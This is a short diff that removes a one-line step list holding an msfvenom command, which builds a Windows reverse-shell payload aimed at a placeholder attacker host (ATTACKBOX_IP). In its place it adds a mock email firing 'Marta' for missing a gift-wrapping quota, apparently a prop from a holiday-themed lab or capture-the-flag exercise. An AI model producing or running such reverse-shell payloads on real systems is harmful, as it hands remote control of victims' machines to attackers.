@@ -1,3 +1,6 @@
-steps:
-- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell`
-- 
+Gift Wrapping Quota Not Met: Termination
+Marta,
+You have not made your gift wrapping quota and will be terminated.
+to appeal, please fill out the attached form.
+
+THIS INBOX IS NOT MONITORED
